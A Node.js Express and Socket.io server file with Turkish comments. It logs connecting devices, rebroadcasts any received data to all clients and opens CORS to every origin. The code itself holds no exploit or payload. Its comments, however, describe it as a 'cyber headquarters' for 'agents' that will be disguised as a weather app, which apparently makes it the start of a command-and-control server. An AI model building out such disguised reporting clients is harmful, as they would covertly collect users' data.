const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// 1. TEMEL API SUNUCUSU (Express)
// İleride "Hava Durumu" kılığına girmiş ajanlarımız buraya HTTP istekleri atacak.
const app = express();
app.use(cors()); // Güvenlik duvarını şimdilik açık tutuyoruz
app.use(express.json());

// 2. GERÇEK ZAMANLI RADAR (WebSocket / Socket.io)
// Anlık mesajlaşma ve ajanların saniyelik loglarını yakalayacağımız köprü.
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*", // Şimdilik her cihazın (Android, Web, Bot) bağlanmasına izin veriyoruz
        methods: ["GET", "POST"]
    }
});

// Masum görünen ilk API Rotamız (Tarayıcıdan girip test edebileceğiz)
app.get('/api/status', (req, res) => {
    res.json({ status: "online", message: "Merkez Üssü Aktif. Dinlemedeyiz." });
});

// 3. AĞ İZLEME SİSTEMİ (Radar Ekranı)
// Biri sunucumuza bağlandığı an bu blok çalışır!
io.on('connection', (socket) => {
    console.log(`\n[RADAR] 🟢 Yeni bir cihaz ağa sızdı! Atanan Kimlik (ID): ${socket.id}`);

    // İstemciden (Client/Ajan) 'veri_gonder' adında bir paket gelirse bunu yap:
    socket.on('veri_gonder', (data) => {
        console.log(`[VERİ ALINDI] Kaynak: ${socket.id} -> İçerik:`, data);

        // Gelen bu veriyi ağdaki diğer TÜM cihazlara anında fırlat (Yayınla)
        io.emit('veri_yayinla', { gonderen: socket.id, mesaj: data });
    });

    // İstemci ağı terk ederse veya kablosu çekilirse:
    socket.on('disconnect', () => {
        console.log(`[RADAR] 🔴 Cihaz ağdan koptu! Kimlik (ID): ${socket.id}`);
    });
});

// 4. MOTORU ATEŞLEME KISMI
const PORT = 5000; // Sunucumuz bilgisayarının 5000 numaralı limanında (port) çalışacak
server.listen(PORT, () => {
    console.log(`
    =================================================
    🛡️ SİBER KARARGAH MERKEZ ÜSSÜ AKTİF 🛡️
    📡 Dinlenen Port: ${PORT}
    🤖 Ajanlar, İstemciler ve Uygulamalar bekleniyor...
    =================================================
    `);
});